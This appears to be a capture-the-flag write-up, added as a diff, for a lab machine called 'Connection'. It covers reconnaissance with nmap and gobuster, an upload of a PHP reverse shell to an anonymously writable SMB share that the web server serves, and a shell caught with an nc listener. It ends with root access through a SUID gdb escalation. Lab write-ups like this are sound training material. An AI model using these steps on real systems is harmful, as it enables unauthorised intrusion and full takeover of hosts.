@@ -1,0 +1,257 @@
+# Connection Writeup #
+
+
+--> Discoverin IP <--
+
+ arp-scan -l | grep "PCS" | awk '{print "\n[+] " $1}'
+
+[+] 10.0.2.3
+
+[+] 10.0.2.64
+
+
+--> Nmap Scanning <--
+
+nmap -p- -A -sCV -T5 10.0.2.64
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 19:45 +03
+Nmap scan report for 10.0.2.64
+Host is up (0.00031s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
+|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
+|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
+80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+MAC Address: 08:00:27:EA:BB:39 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h23m10s, deviation: 2h18m33s, median: 3m10s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-time: 
+|   date: 2022-09-22T16:49:18
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: connection
+|   NetBIOS computer name: CONNECTION\x00
+|   Domain name: \x00
+|   FQDN: connection
+|_  System time: 2022-09-22T12:49:18-04:00
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.31 ms 10.0.2.64
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.27 seconds
+zsh: segmentation fault  nmap -p- -A -sCV -T5 10.0.2.64
+
+
+--> Gobuster Scanning <--
+
+gobuster dir -u http://10.0.2.64 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,css,txt,bak,zip,jpeg     
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.64
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              css,txt,bak,zip,jpeg,html,php
+[+] Timeout:                 10s
+===============================================================
+2022/09/22 19:47:50 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 10701]
+/server-status        (Status: 403) [Size: 274]  
+                                                 
+===============================================================
+2022/09/22 19:50:03 Finished
+===============================================================
+
+--> We couldn't find anything
+
+
+--> Connecting to a SMBCLIENT <--
+
+--> smbclient -L 10.0.2.64          
+Password for [WORKGROUP\seraph]:
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	share           Disk      
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (Private Share for uploading files)
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            CONNECTION
+                                   
+--> smbclient \\\\10.0.2.64\\share 
+
+Password for [WORKGROUP\seraph]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Sep 23 04:48:39 2020
+  ..                                  D        0  Wed Sep 23 04:48:39 2020
+  html                                D        0  Wed Sep 23 05:20:00 2020
+
+		7158264 blocks of size 1024. 5258096 blocks available
+smb: \> cd html
+smb: \html\> ls
+  .                                   D        0  Wed Sep 23 05:20:00 2020
+  ..                                  D        0  Wed Sep 23 04:48:39 2020
+  index.html                          N    10701  Wed Sep 23 04:48:45 2020
+
+		7158264 blocks of size 1024. 5258096 blocks available
+smb: \html\> put forbidden.php
+putting file forbidden.php as \html\forbidden.php (19,1 kb/s) (average 19,1 kb/s)
+smb: \html\> ls
+  .                                   D        0  Thu Sep 22 20:01:04 2022
+  ..                                  D        0  Wed Sep 23 04:48:39 2020
+  index.html                          N    10701  Wed Sep 23 04:48:45 2020
+  forbidden.php                       A     2583  Thu Sep 22 20:01:04 2022 --> This is our reverse shell you can use pentest monkeys reverse-sheell
+
+		7158264 blocks of size 1024. 5258084 blocks available
+smb: \html\> exit
+                 
+--> In this part we put our Reverse-Shell into the smbclient html part
+
+--> curl http://10.0.2.64/forbidden.php --> we ran the shell 
+
+
+--> Connecting to the machine 
+
+nc -nlvp 9001
+listening on [any] 9001 ...
+connect to [10.0.2.32] from (UNKNOWN) [10.0.2.64] 55578
+Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
+ 13:02:14 up 15 min,  0 users,  load average: 0.00, 0.51, 0.64
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@connection:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@connection:/$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+www-data@connection:/$ export TERM=xterm-250color
+export TERM=xterm-250color
+www-data@connection:/$ alias ll='clear ; ls -lsaht --color=auto'
+alias ll='clear ; ls -lsaht --color=auto'
+www-data@connection:/$ ^Z
+stty raw -echo ; fg ; reset 
+[1]  + continued  nc -nlvp 9001
+                               stty columns 200 rows 200
+www-data@connection:/$ ls -la
+total 68
+drwxr-xr-x 18 root root  4096 Sep 22  2020 .
+drwxr-xr-x 18 root root  4096 Sep 22  2020 ..
+lrwxrwxrwx  1 root root     7 Sep 22  2020 bin -> usr/bin
+drwxr-xr-x  3 root root  4096 Sep 22  2020 boot
+drwxr-xr-x 17 root root  3220 Sep 22 12:43 dev
+drwxr-xr-x 77 root root  4096 Sep 22 13:00 etc
+drwxr-xr-x  3 root root  4096 Sep 22  2020 home
+lrwxrwxrwx  1 root root    31 Sep 22  2020 initrd.img -> boot/initrd.img-4.19.0-10-amd64
+lrwxrwxrwx  1 root root    31 Sep 22  2020 initrd.img.old -> boot/initrd.img-4.19.0-10-amd64
+lrwxrwxrwx  1 root root     7 Sep 22  2020 lib -> usr/lib
+lrwxrwxrwx  1 root root     9 Sep 22  2020 lib32 -> usr/lib32
+lrwxrwxrwx  1 root root     9 Sep 22  2020 lib64 -> usr/lib64
+lrwxrwxrwx  1 root root    10 Sep 22  2020 libx32 -> usr/libx32
+drwx------  2 root root 16384 Sep 22  2020 lost+found
+drwxr-xr-x  4 root root  4096 Sep 22  2020 media
+drwxr-xr-x  2 root root  4096 Sep 22  2020 mnt
+drwxr-xr-x  2 root root  4096 Sep 22  2020 opt
+dr-xr-xr-x 94 root root     0 Sep 22 12:43 proc
+drwx------  3 root root  4096 Sep 22  2020 root
+drwxr-xr-x 17 root root   500 Sep 22 12:43 run
+lrwxrwxrwx  1 root root     8 Sep 22  2020 sbin -> usr/sbin
+drwxr-xr-x  2 root root  4096 Sep 22  2020 srv
+dr-xr-xr-x 13 root root     0 Sep 22 12:43 sys
+drwxrwxrwt  2 root root  4096 Sep 22 12:43 tmp
+drwxr-xr-x 13 root root  4096 Sep 22  2020 usr
+drwxr-xr-x 12 root root  4096 Sep 22  2020 var
+lrwxrwxrwx  1 root root    28 Sep 22  2020 vmlinuz -> boot/vmlinuz-4.19.0-10-amd64
+lrwxrwxrwx  1 root root    28 Sep 22  2020 vmlinuz.old -> boot/vmlinuz-4.19.0-10-amd64
+www-data@connection:/$ find / -perm -4000 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/gdb
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/gpasswd
+
+
+-->  Privilage Escelation https://gtfobins.github.io/ we serach the gdb from this site <--
+
+www-data@connection:/$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit 
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+# cd root
+# ls
+proof.txt
+# cat proof.txt
+********************************** <-- This is your root flag
+# cd home
+# ls
+connection
+# cd connection
+# ls
+local.txt
+# cat local.txt
+********************************** <-- This is your user flag
+
+
